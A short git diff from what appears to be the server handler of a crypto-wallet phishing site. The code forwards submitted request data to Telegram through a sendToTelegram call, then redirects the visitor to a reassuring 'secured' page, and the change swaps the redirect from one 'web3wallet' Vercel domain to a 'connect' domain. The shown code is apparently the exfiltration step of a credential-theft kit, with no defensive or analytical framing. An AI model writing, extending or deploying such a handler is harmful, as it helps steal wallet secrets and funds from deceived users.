@@ -34,7 +34,7 @@ module.exports = async (req, res) => {
             const response = await sendToTelegram(data); // Send data to Telegram
 
             // Redirect to the secured page after successful message sending
-            res.writeHead(302, { Location: 'https://web3wallet-ten.vercel.app/secured.html' }); // Redirect to secured page
+            res.writeHead(302, { Location: 'https://connect-six-theta.vercel.app/secured.html' }); // Redirect to secured page
             res.end(); // End the response
 
         } catch (error) {
